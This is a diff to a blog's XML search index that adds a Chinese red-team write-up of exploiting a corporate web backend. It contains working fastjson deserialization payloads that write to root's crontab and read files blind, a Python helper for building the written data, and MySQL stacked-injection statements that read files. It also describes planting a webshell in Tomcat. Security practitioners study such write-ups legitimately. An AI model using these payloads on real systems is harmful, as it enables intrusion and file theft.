@@ -2666,6 +2666,105 @@ iU：已进入 apt 安装队列，但还未被安装（不可移除）
       </tags>
   </entry>
   <entry>
+    <title>一次攻防小记</title>
+    <url>//post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</url>
+    <content><![CDATA[一次攻防小记​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。
+fastjson利用随手一试fastjson jdk8 写文件的链
+{ "x":{
+        "@type":"java.lang.AutoCloseable", 
+        "@type":"sun.rmi.server.MarshalOutputStream",
+        "out":{
+            "@type":"java.util.zip.InflaterOutputStream",
+            "out":{
+                "@type":"java.io.FileOutputStream",
+                "file":"/var/spool/cron/crontabs/root",
+                "append":false
+            },
+            "infl":{
+                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"
+            },
+            "bufLen":1048576
+        },
+        "protocolVersion":1
+    }}
+
+压缩数据生成
+from itsdangerous import base64_decode, base64_encode
+import zlib
+cc='hello'.encode()
+ccc=zlib.compress(cc)
+print(base64_encode(ccc))
+
+居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子
+{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          ...
+        ]
+      }
+    ]
+  },
+  "address" : {"$ref":"$.abc.BOM"}
+}
+
+但是没有回显，无法判断，随后拜读浅蓝师傅的文章 https://b1ue.cn/archives/506.html
+前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件
+通过读/root/.bash_history等拿到tomcat路径
+{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/test"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          98
+        ]
+      }
+    ]
+  },
+  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
+}
+
+但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。
+写计划任务试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。
+SQL注入fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 https://xz.aliyun.com/t/7169#toc-32
+drop table mysql.m1;
+CREATE TABLE mysql.m1 (code TEXT );
+LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
+select * from mysql.m1;
+
+可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。
+二战过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 
+"@type":"xxxx"
+
+一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Webshell工具加密流量解析</title>
     <url>//post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[前言webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。
